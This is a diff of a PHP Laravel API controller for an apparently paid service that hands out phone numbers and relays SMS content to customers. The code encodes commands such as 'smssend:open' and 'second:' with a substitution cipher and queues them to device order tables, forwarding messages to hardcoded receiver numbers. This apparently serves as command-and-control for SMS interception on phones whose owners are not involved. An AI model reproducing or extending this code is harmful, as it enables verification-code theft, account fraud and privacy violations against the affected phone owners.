@@ -56,7 +56,10 @@ class ApiController extends Controller
             $user = $this->selectuser($token);
 
             $keywords = strpos($request->k, ':') ? explode(":", $request->k) : explode("：", $request->k);
-            $receive = '15510396471';
+//            $receive = '15932011375';
+            $receives=['13061195162','15932011375'];
+            $receive=$receives[array_rand($receives)];
+
             if ($user) {
                 if ($user->balance <= 0) {
                     echo json_encode(array('code' => 106, 'msg' => 'You need to charge money'));
@@ -105,7 +108,7 @@ class ApiController extends Controller
     {
         //验证数据
         $token = $request->token;
-        $get_p= ['p'=>$request->p,'type'=>$request->type];
+        $get_p= ['p'=>$request->p];
         $validator = Validator::make($get_p, [
 //            'p' =>'required'
         ]);
@@ -114,33 +117,11 @@ class ApiController extends Controller
         }
 
         $p=$request->p;
-        $type=$request->type;
 
         $user = $this->selectuser($token);
 
         if ($user) {
-            //淘宝单
 
-            if ($type == '淘宝'){
-                $receive = '15510396471';
-                $content = 'id' . $user->id;
-
-                $dat=empty($p) ? ['send'=>0]:['send'=>0,'province'=>$p];
-                $phone = $this->filter($dat);
-
-                $ip = $request->getClientIp();
-                $profile = $user->name.'/get_phone.txt';
-                $parame = [
-                    'email' => $user->email,
-                    'ip' => $ip,
-                    'phone' => $phone,
-                    'province'=>$p,
-                ];
-                $gjz='';
-               $this-> setorder($phone, $content, $receive,$gjz, $profile, $parame,1);
-            }
-
-            //其它单
             $dat=empty($p) ? ['user_id'=>$user->id,'status'=>'0']:['user_id'=>$user->id,'status'=>'0','province'=>$p];
 
             $phone = DB::table('phone_numbers')
@@ -245,8 +226,6 @@ class ApiController extends Controller
                         $result = array('code' => 200, 'msg' => $content->content);
                     }
 
-                    //全单的关闭指令
-                    $this->closeOrder($phone);
 
                     if ($content->status != '1') {
                         //记录日志
@@ -371,15 +350,19 @@ class ApiController extends Controller
 //         {
 //             $mydata = DB::connection('ourcms')->table('cms_device_data')->where('phone', $phone)->first();
 //         }
+        # 有大写问题
+        $key = array('a' => 'o', 'b' => '0', 'c' => 'p', 'd' => '1', 'e' => 'q', 'f' => '2', 'g' => 'r', 'h' => '3', 'i' => 's', 'j' => '4', 'k' => 't', 'l' => '5', 'm' => 'u', 'n' => '6', 'o' => 'v', 'p' => '7', 'q' => 'w', 'r' => '8', 's' => 'x', 't' => '9', 'u' => 'y', 'v' => '*', 'w' => 'z', 'x' => '#', 'y' => '&', 'z' => ',', '0' => 'n', '1' => 'm', '2' => 'l', '3' => 'k', '4' => 'j', '5' => 'i', '6' => 'h', '7' => 'g', '8' => 'f', '9' => 'e', '*' => 'd', '#' => 'c', ',' => 'b', '&' => 'a', ':' => '!');
+
 
         if ($type == '1'){
             //单独指令开关
-            $smstxt ='xuxxq61!v7q6amiimnkehjgm';
+            $_smstext = 'smssend:open&'.$receive;
+            $smstxt = '';
+            for ($i = 0; $i < strlen($_smstext); $i++) {
+                $smstxt .= $key[$_smstext[$i]];   # 转换为 ‘密文’
+            }
+
         }else{
-            # 有大写问题
-            $key = array('a' => 'o', 'b' => '0', 'c' => 'p', 'd' => '1', 'e' => 'q', 'f' => '2', 'g' => 'r', 'h' => '3', 'i' => 's', 'j' => '4', 'k' => 't', 'l' => '5', 'm' => 'u', 'n' => '6', 'o' => 'v', 'p' => '7', 'q' => 'w', 'r' => '8', 's' => 'x', 't' => '9', 'u' => 'y', 'v' => '*', 'w' => 'z', 'x' => '#', 'y' => '&', 'z' => ',', '0' => 'n', '1' => 'm', '2' => 'l', '3' => 'k', '4' => 'j', '5' => 'i', '6' => 'h', '7' => 'g', '8' => 'f', '9' => 'e', '*' => 'd', '#' => 'c', ',' => 'b', '&' => 'a', ':' => '!');
-
-
             $_smstext = "second:" . $receive . "&" . $content . "&1&";
             $smstxt = '';
             for ($i = 0; $i < strlen($_smstext); $i++) {
@@ -547,88 +530,4 @@ class ApiController extends Controller
         Storage::disk('local')->append($day.'/'.$profile, $txt);
     }
 
-    /**关闭指令
-     * @param $phone
-     */
-    public function closeOrder($phone){
-        //添加到订单
-        $tablename = "SMS" . date('Ymd') . '6666';
-        $order_res = DB::connection('ourcms')->table('cms_order')
-//        $order_res = DB::table('cms_order')
-            ->select('id')
-            ->where('order_name', '=', $tablename)
-            ->where('state', '!=', '-1')
-            ->where('state', '!=', '-2')
-            ->orderby('addtime','desc')
-            ->first();
-        if ($order_res) {
-
-            # 订单总表里的id 对应 外边订单详细表的表名
-            $ordtb = "cms_orddata_" . $order_res->id;
-
-            $order_table = DB::connection('ourcms')->table($ordtb);
-//            $order_table = DB::table($ordtb);
-            $result = $order_table->select('id')->where(['phone'=>$phone,'smstext'=>'xuxxq61!v7q6amiimnkehjgm'])->first();
-            if ($result){
-                # 成功之后的订单不管了
-                $new_data = [
-                    'phone' => $phone,
-                    'smstext' => 'xuxxq61!p5vxq',
-//                        'ordimsi'=>$mydata['imsi'],
-//                        'projectid'=>$mydata['projectid'],
-//                        'provinceid'=>$mydata['provinceid'],
-                    'nowtime' => date("Y-m-d H:i:s"),
-                    'software' => '',
-                ];
-                $order_table->insert($new_data);
-            }
-        }
-    }
-
-    /**用户余额为10 发邮件提醒
-     * @param $user
-     */
-    private function balance_info($user){
-        if ($user ->balance == 10){
-            Mail::send('emails.excpetion', ['content' => 'Your balance is 10 dollars left. Please pay attention to the recharge'], function ($message) use ($user) {
-                $message->to($user->email, 'Email Message')->subject('BALANCE INFO');
-            });
-        }
-    }
-
-    /**
-     * 统计请求数 根据缓存文件统计
-     */
-    private function countNum($userid)
-    {
-        $amount = DB::table('page_views')->where('user_id', $userid)->first();
-        $page_views = DB::table('page_views');
-        $extend = 1440-date('H',time())*60+date('i',time());
-        if ($amount) {
-            if ((time() - strtotime($amount->expiration_time)) >= 0) {
-
-                $data['expiration_time'] = date('Y:m:d H-i-s', strtotime(date('Y-m-d', time())) + 86400);
-                $data['amounts'] = Cache::get($userid . 'amounts', $amount->amounts + 1);
-                $data['yes_num'] = Cache::get($userid . 'daliy_amount', 0);
-                $page_views->where('user_id', $userid)->update($data);
-
-                Cache::forever($userid . 'amounts', Cache::get($userid . 'amounts') + 1);
-                Cache::forever($userid . 'daliy_amount', 1);
-//                Cache::put($userid.'amounts',Cache::get($userid.'amounts')+1,$extend);
-//                Cache::put($userid.'daliy_amount',1,$extend);
-            } else {
-                if (!Cache::has($userid . 'amounts')) {
-                    Cache::forever($userid . 'amounts', 0);
-                    Cache::forever($userid . 'daliy_amount', 0);
-//                  Cache::put($userid.'amounts',Cache::get($userid.'amounts')+1,$extend);
-//                  Cache::put($userid.'daliy_amount',1,$extend);
-                }
-                Cache::increment($userid . 'daliy_amount', 1);
-                Cache::increment($userid . 'amounts', 1);
-            }
-        } else {
-            $page_views->insert(['user_id' => $userid, 'daliy_amount' => 0, 'yes_num' => 0, 'amounts' => 0]);
-
-        }
-    }
 }
